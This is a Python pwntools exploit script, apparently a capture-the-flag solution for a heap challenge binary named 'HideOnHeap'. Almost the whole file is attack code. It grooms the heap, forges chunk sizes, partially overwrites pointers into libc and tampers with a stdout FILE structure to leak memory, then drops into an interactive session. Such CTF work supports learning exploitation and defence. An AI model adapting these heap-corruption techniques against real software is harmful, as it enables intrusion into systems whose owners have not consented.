# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './HideOnHeap'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size ):
    cmd(1)
    sla('Size:' , size)

def edit(idx , text):
    cmd(2)
    sla('Index:' , idx)
    sa('Content:' , text)

def delete(idx ):
    cmd(3)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    add(0x38)
    add(0x508)
    for i in range(8):
        add(0x38)

    for i in range(8):
        delete(i+2)

    delete(0)
    delete(9)

    for i in range(7):
        add(0x38)
    add(0x38)
    edit(8 , '\x60')
    add(0x38)
    add(0x38)
    add(0x38)

    delete(1)
    add(0x38)
    add(0x4c8)

    delete(0)
    delete(1)
    edit(11 , flat(0,0,0,0x511,0,0))
    delete(1)

    add(0x508)
    edit(0 , p16(0x35c0))
    add(0x38)
    add(0x38)

    delete(0)
    add(0x38)
    add(0x4c8)

    delete(2)
    delete(0)
    edit(11 , flat(0,0,0,0x511,0,0))
    delete(0)

    add(0x508)
    edit(0 , p16(0x5b80))
    add(0x38)
    add(0x38)

    add(0x1000)
    add(0x38)

    delete(0)
    add(0x38)
    add(0x4c8)
    
    delete(17)
    delete(0)

    edit(11 , flat(0,0,0,0x41) + '\xc0')

    add(0x38)
    add(0x38)

    edit(16 , flat(0,0x21)*0x100)
    edit(15 , '\xff'*8)
    
    edit(11 , flat(0,0,0,0x14c1))
    delete(0)
    edit(11 , flat(0,0,0,0x14d1))
    delete(0)
    edit(11 , flat(0,0,0,0x14e1))
    delete(0)

    edit(13 , flat(0xfbad1800 , 0,0,0) + '\x00')
    edit(17 , flat(0,0,0,0xf1))
    edit(15 , p64(0x80))
    add(0x100)

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   HideOnHeap-16.py
@Time    :   2022/02/16 17:42:10
@Author  :   Niyah 
'''